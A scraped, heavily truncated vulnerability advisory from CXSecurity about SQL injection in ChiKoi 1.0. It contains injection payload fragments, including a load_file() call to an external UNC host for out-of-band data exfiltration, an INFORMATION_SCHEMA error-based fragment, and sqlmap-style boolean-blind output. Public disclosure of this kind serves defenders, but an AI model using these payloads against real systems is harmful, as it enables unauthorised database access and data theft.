---
title: ChiKoi 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023010021
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-16
fetch_date: 2025-10-04T03:58:25.392889
---
...
|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ChiKoi 1.0 SQL Injection** **2023.01.15**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |
...
The payload '+(select
load\_file('\\\\v3z9cjkbngnzrm7piruwhl6olfr8fzknbqzlmba0.glumar.com\\quv'))+'
...
INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a)-- VCWR
---
```
[+] Online:
```MySQL
...
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
Payload: Mozilla/5.0 (X11; U; Linux x86\_64; en-US; rv:1.8.1)
...
[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010021)
